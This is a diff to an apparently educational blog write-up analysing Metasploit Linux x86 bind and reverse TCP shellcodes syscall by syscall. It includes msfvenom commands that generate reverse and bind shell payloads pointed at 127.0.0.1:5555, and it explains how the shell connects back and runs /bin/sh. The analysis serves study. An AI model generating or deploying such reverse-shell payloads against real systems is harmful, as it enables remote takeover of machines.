@@ -106,7 +106,7 @@ This step should be easy to comprehend. Two things we should note here is that h
 ### accept syscall
 In this step we just increment `EBX` by 1 making it 0x05 which is equal to SYS_ACCEPT. Then as usual we load the syscall value in `EAX` and execute the syscall.
 ### dup2 syscall
-We are going to duplicate into our accepted connection socket which we got back from the previous step the STDIN/0, STDOUT/1, and STDERR/2 file descriptors(fd) to make the connection interactive in this step. In the first instruction, `EBX` now has the value of `EAX` which contains the connection socket. `ECX` will be used as the counter register here. After that, the syscall value for dup2 is pushed into the stack and the syscall is executed. For the next iteration, the `ECX` is decremented and the loop continues until the Sign Flag(SF) is not set.
+We are going to duplicate into our accepted connection socket which we got back from the previous step the STDIN/0, STDOUT/1, and STDERR/2 file descriptors(fd) to make the connection interactive in this step. In the first instruction, `EBX` now has the value of `EAX` which contains the connection socket. `ECX` will be used as the counter register here. After that, the syscall value for dup2 is pushed into the stack and the syscall is executed. For the next iteration, the `ECX` is decremented and the loop continues until the Sign Flag(SF) is set.
 ### execve syscall
 The last step is actually all too familiar now that is executing the "/bin/sh" to enable the attackers to execute any command on the machine remotely. There is not much to discuss here as it's pretty standard.
 
@@ -115,12 +115,12 @@ This is again a standard Reverse TCP payload(not to be confused with Meterpreter
 
 Generation of the shellcode is as easy as:
 ```
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.104 LPORT=8080 -f c
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=5555 -f c
 ```
 
 And the graph as follows:
 ```
-msfvenom -p linux/x86/shell_bind_tcp LHOST=192.168.1.104 LPORT=8080 -f raw | sctest -vvv -Ss 100000 -G linux-x86-reverseshell.dot
+msfvenom -p linux/x86/shell_bind_tcp LHOST=127.0.0.1 LPORT=5555 -f raw | sctest -vvv -Ss 100000 -G linux-x86-reverseshell.dot
 
 dot linux-x86-reverseshell.dot -Tpng -o linux-x86-reverseshell.png
 ```
@@ -139,4 +139,12 @@ When that's done let's move in for the detailed analysis but not before identify
 We can verify this with the help of [Blog Post 2](https://slaeryan.github.io/posts/slae-assignment2-blogpost.html) where we created our own Reverse TCP shellcode.
 
 ### socket syscall
+We begin by clearing out `EBX` register by XORing it with itself and then the same 'ole trick of clearing `EAX` using `mul`. Then we begin setting up the stack for the socket syscall arguments by first pushing 0x00 = _IPPROTO_IP_, 0x01 = _SOCK_STREAM_ and 0x02 = _AF_INET_. Then ECX is made to point to the TOS which contains our arguments. After that, it's as simple as loading the appropiate syscall number in `AL` and executing the syscall.
+### dup2 syscall
+This step is same as the one we evaluated in the Bind TCP payload(duplicating into our accepted connection socket which we got back from the previous step the STDIN/0, STDOUT/1, and STDERR/2 file descriptors(fd) to make the connection interactive for the attackers.
+### connect syscall
+This step is almost identical to the bind syscall step in the Bind TCP payload we analyzed before. We begin by creating the sockdaddr_in struct. Note that here we push the IP of the server too which in this case is 127.0.0.1 or 0x100007f and the remote port which is 5555 or 0xb315 in our case(Both the C2 IP and port are reversed for satisfying the little-endianness of x86 architecture). The 0x0002 appended to the port is actually for specifying the addressing schema which is IPv4 or _AF_INET_. After the struct is made, `ECX` is made to point to the location of the struct on the stack. Then we load the syscall for connect() in `AL`, push EAX into the stack, push ECX into the stack, push EBX into the stack which contains the socket file descriptor, load `BL` with 0x03 which is equal to _SYS_CONNECT_, adjust ECX and execute the syscall.
+### execve syscall
+Finally we execute the execve() syscall with **/bin/sh** to get an interactive shell on the target machine. This part is pretty self-explanatory and we have gone through it many times before.
 
+With this we have officially completed the analysis of three metasploit shellcodes.
